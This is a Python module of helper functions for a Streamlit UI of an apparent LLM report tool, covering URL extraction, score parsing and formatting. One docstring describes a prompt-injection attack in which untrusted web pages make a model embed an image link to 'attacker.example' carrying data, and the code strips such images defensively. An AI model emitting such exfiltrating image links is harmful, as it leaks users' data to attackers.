"""Pure helper functions used by the Streamlit UI (no Streamlit imports, easy to test)."""
import re

URL_RE = re.compile(r"https?://[^\s)\]>\"'<]+")


def extract_urls(*texts: str) -> list[str]:
    """Return de-duplicated URLs found in the given texts, preserving order."""
    seen, out = set(), []
    for t in texts:
        for u in URL_RE.findall(t or ""):
            u = u.rstrip(".,;:")
            if u not in seen:
                seen.add(u)
                out.append(u)
    return out


def parse_score(feedback: str):
    """Extract the numeric score from the critic's ``Score: X/10`` line, or None."""
    m = re.search(r"Score:\s*\**\s*(\d+(?:\.\d+)?)\**\s*/\s*10", feedback or "", re.I)
    return float(m.group(1)) if m else None


def host_of(url: str) -> str:
    """Return the host part of a URL without a leading ``www.``."""
    m = re.match(r"https?://(?:www\.)?([^/]+)", url)
    return m.group(1) if m else url


def score_color(score: float) -> str:
    """CSS color variable for a score: green >= 8, amber >= 6, red below."""
    return "var(--ok)" if score >= 8 else "var(--warn)" if score >= 6 else "var(--err)"


def fmt_seconds(sec: float) -> str:
    """Format a duration as ``45s`` or ``2m 5s``."""
    return f"{sec:.0f}s" if sec < 90 else f"{sec // 60:.0f}m {sec % 60:.0f}s"


_MD_IMAGE_INLINE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
_MD_IMAGE_REFERENCE = re.compile(r"!\[([^\]]*)\]\[[^\]]*\]")
_HTML_IMG = re.compile(r"<img\b[^>]*>", re.I)


def strip_markdown_images(text: str) -> str:
    """Remove images from LLM-written Markdown, keeping their alt text.

    The report is built from untrusted web pages, so a prompt injection could make
    the model embed ``![](https://attacker.example/?data=...)``; rendering that would
    make the viewer's browser call the attacker. Plain links are left alone.
    """
    text = _MD_IMAGE_INLINE.sub(r"\1", text or "")
    text = _MD_IMAGE_REFERENCE.sub(r"\1", text)
    return _HTML_IMG.sub("", text)


def running_step(states: dict) -> str | None:
    """Return the key of the step currently marked ``running``, or None."""
    return next((key for key, state in states.items() if state == "running"), None)
